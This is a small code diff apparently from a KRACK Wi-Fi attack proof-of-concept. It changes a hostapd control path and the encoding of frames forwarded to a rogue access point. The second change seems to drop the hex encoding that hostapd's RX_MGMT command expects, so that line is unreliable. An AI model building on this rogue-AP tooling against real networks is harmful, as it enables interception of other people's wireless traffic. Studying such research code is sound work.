@@ -88,7 +88,7 @@ class NetworkConfig():
 	# hostapd.confg寫檔 
 	def write_config(self, iface):
 		TEMPLATE = """
-ctrl_interface=/home/sun/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
+ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
 ctrl_interface_group=root
 
 interface={iface}
@@ -223,7 +223,7 @@ class KRAckAttack():
 
 	def hostapd_rx_mgmt(self, p):
 		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
-		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
+		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode())
 
 	def hostapd_add_sta(self, macaddr):
 		log(DEBUG, "Forwarding auth to rouge AP to register client", showtime=False)
